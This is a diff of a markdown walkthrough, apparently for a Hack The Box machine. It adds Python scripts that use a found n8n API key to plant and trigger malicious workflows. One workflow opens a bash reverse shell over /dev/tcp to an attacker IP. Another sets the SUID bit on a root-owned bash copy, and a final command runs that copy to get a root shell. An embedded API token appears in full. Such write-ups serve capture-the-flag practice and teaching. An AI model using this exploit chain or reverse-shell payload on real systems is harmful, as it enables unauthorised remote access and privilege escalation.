@@ -262,7 +262,7 @@ systemctl cat htb-air
 ---
 
 
-## exploit n8n
+## 
 
 
 ```python
@@ -292,6 +292,111 @@ curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
 
 
 ----
+
+## exploit n8n
+
+```python
+import requests
+import json
+
+API_KEY = "<FOUND_N8N_API_KEY>"
+TARGET = "http://127.0.0.1:5678/api/v1"
+
+HEADERS = {
+    "X-N8N-API-KEY": API_KEY,
+    "Content-Type": "application/json"
+}
+
+LHOST = "10.10.14.25"
+LPORT = "9002"
+
+wf = {
+    "name": "root_pwn",
+    "nodes": [
+        {
+            "parameters": {
+                "httpMethod": "GET",
+                "path": "pwn",
+                "responseMode": "responseNode"
+            },
+            "id": "webhook-1",
+            "name": "Webhook",
+            "type": "n8n-nodes-base.webhook",
+            "typeVersion": 2,
+            "position": [240, 300],
+            "webhookId": "pwn-uuid-001"
+        },
+        {
+            "parameters": {
+                "command": f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
+            },
+            "id": "exec-1",
+            "name": "Execute Command",
+            "type": "n8n-nodes-base.executeCommand",
+            "typeVersion": 1,
+            "position": [460, 300]
+        },
+        {
+            "parameters": {},
+            "id": "respond-1",
+            "name": "Respond to Webhook",
+            "type": "n8n-nodes-base.respondToWebhook",
+            "typeVersion": 1,
+            "position": [680, 300]
+        }
+    ],
+    "connections": {
+        "Webhook": {
+            "main": [[
+                {
+                    "node": "Execute Command",
+                    "type": "main",
+                    "index": 0
+                }
+            ]]
+        },
+        "Execute Command": {
+            "main": [[
+                {
+                    "node": "Respond to Webhook",
+                    "type": "main",
+                    "index": 0
+                }
+            ]]
+        }
+    },
+    "settings": {
+        "executionOrder": "v1"
+    }
+}
+
+r = requests.post(
+    f"{TARGET}/workflows",
+    json=wf,
+    headers=HEADERS
+)
+
+wf_id = r.json()["id"]
+
+requests.post(
+    f"{TARGET}/workflows/{wf_id}/activate",
+    headers=HEADERS
+)
+
+requests.get("http://127.0.0.1:5678/webhook/pwn")
+```
+
+
+## root Breakout
+
+> ###  filesystem mount between the n8n container and the host.
+
+> ### **According to the observed configuration, the container's /root directory is mounted to /home/kpark on the host. This means that files created under the relevant container path are also accessible through the corresponding host path.**
+
+----
+
+
+
 
 ## Generate the SSH Key Pair
 
@@ -375,20 +480,93 @@ ssh -i kpark_key kpark@takeoff.htb
 <img width="1452" height="378" alt="image" src="https://github.com/user-attachments/assets/8a51fb52-f910-49e5-a4b9-b400f4a5e5af" />
 
 
+----
+
+
+## Privilege Escalation
+
+> ### The approach described in the original notes is to create a Bash copy in /home/kpark and then use the container-side workflow to change its ownership and set its SUID permission bit.
+
+
+##  Create a Bash Copy
+
+```
+cp /bin/bash /home/kpark/hb
+```
+
+---
+
+##  Set Ownership and SUID Permissions 
 
 
 
+```python
+import requests
+
+API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo"
+TARGET = "http://127.0.0.1:5678/api/v1"
+
+HEADERS = {
+    "X-N8N-API-KEY": API_KEY,
+    "Content-Type": "application/json"
+}
+
+# The command to set root ownership and SUID bit
+command = "chown root:root /root/hb && chmod 4755 /root/hb"
+
+wf = {
+    "name": "suid_pwn",
+    "nodes": [
+        {
+            "parameters": {"httpMethod": "GET", "path": "suidpwn", "responseMode": "responseNode"},
+            "id": "webhook-1", "name": "Webhook", "type": "n8n-nodes-base.webhook",
+            "typeVersion": 2, "position": [240, 300], "webhookId": "suid-uuid-001"
+        },
+        {
+            "parameters": {"command": command},
+            "id": "exec-1", "name": "Execute Command", "type": "n8n-nodes-base.executeCommand",
+            "typeVersion": 1, "position": [460, 300]
+        },
+        {
+            "parameters": {}, "id": "respond-1", "name": "Respond to Webhook",
+            "type": "n8n-nodes-base.respondToWebhook", "typeVersion": 1, "position": [680, 300]
+        }
+    ],
+    "connections": {
+        "Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]},
+        "Execute Command": {"main": [[{"node": "Respond to Webhook", "type": "main", "index": 0}]]}
+    },
+    "settings": {"executionOrder": "v1"}
+}
+
+print("[*] Creating workflow...")
+r = requests.post(f"{TARGET}/workflows", json=wf, headers=HEADERS)
+wf_id = r.json()["id"]
+
+print(f"[*] Activating workflow {wf_id}...")
+requests.post(f"{TARGET}/workflows/{wf_id}/activate", headers=HEADERS)
+
+print("[*] Triggering webhook...")
+try:
+    requests.get("http://127.0.0.1:5678/webhook/suidpwn", timeout=3)
+except Exception:
+    pass
+
+print("[*] Done. Check /home/kpark/hb on the host.")
+
+```
+
+---
+
+## Obtain a Root Shell
 
 
+```
+/home/kpark/hb -p
+```
 
 
-
-
-
-
-
-
-
+<img width="949" height="73" alt="image" src="https://github.com/user-attachments/assets/6e6bc4df-50ec-4c00-bb80-d538a7206438" />
 
 
 
